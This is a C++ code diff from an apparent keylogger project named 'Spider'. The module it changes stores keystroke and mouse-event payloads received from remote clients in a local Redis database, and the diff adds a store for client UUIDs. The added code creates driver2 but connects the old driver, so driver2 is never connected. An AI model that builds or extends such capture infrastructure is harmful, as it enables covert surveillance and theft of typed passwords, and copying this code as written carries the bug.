@@ -20,23 +20,28 @@
 class StoreToDBModule : public ISpiderBusinessModule {
     std::unique_ptr<ISpiderEventListener<SpiderKeyLoggingPayload>> _eventKeylogListener = std::unique_ptr<ISpiderEventListener<SpiderKeyLoggingPayload>>(new SpiderEventListener<SpiderKeyLoggingPayload>());
     std::unique_ptr<ISpiderEventListener<SpiderMouseEvent>> _eventMouseListener = std::unique_ptr<ISpiderEventListener<SpiderMouseEvent>>(new SpiderEventListener<SpiderMouseEvent>());
-    std::unique_ptr<ISpiderEventListener<testPayload>> _eventTestListener = std::unique_ptr<ISpiderEventListener<testPayload>>(new SpiderEventListener<testPayload>());
+    std::unique_ptr<ISpiderEventListener<SpiderEnveloppe>> _eventListener = std::unique_ptr<ISpiderEventListener<SpiderEnveloppe>>(new SpiderEventListener<SpiderEnveloppe>());
     std::unique_ptr<ISpiderEventEmitter> _eventEmitter = std::unique_ptr<ISpiderEventEmitter>(new SpiderEventEmitter());
 
     std::unique_ptr<SpiderTypedRepositoryDriver<SpiderKeyLoggingPayload>> _keylogRepository = nullptr;
     std::unique_ptr<SpiderTypedRepositoryDriver<SpiderMouseEvent>> _mouselogRepository = nullptr;
+    std::unique_ptr<ISpiderKeyValueDatabaseDriver> _uuidRepository = nullptr;
 
 private:
 
 public:
     StoreToDBModule() {
-        RedisDriver *driver = new RedisDriver();
+        RedisDriver<List> *driver = new RedisDriver<List>();
         driver->Connect("127.0.0.1", 6379, "", "");
         _keylogRepository = std::unique_ptr<SpiderTypedRepositoryDriver<SpiderKeyLoggingPayload>>(new SpiderTypedRepositoryDriver<SpiderKeyLoggingPayload>(driver));
-        driver = new RedisDriver();
+
+        driver = new RedisDriver<List>();
         driver->Connect("127.0.0.1", 6379, "", "");
         _mouselogRepository = std::unique_ptr<SpiderTypedRepositoryDriver<SpiderMouseEvent>>(new SpiderTypedRepositoryDriver<SpiderMouseEvent>(driver));
 
+        auto driver2 = new RedisDriver<Sets>();
+        driver->Connect("127.0.0.1", 6379, "", "");
+        _uuidRepository = std::unique_ptr<ISpiderKeyValueDatabaseDriver>(driver2);
 
         _eventKeylogListener->Register("SpiderKeyLoggingPayload", [&](std::string clientId, SpiderKeyLoggingPayload &payload) {
             _keylogRepository->PushElement("keylog" + clientId, payload);
@@ -44,6 +49,11 @@ public:
 
         _eventMouseListener->Register("SpiderMouseEvent", [&](std::string clientId, SpiderMouseEvent &payload) {
             _mouselogRepository->PushElement("mouselog" + clientId, payload);
+        });
+
+        _eventListener->RegisterNoUnpack("", [&](std::string clientId, SpiderEnveloppe &payload) {
+            if (clientId.size() == 16 && payload.clientid().size() == 16)
+                _uuidRepository->PushElement("uuids", clientId);
         });
     }
 };
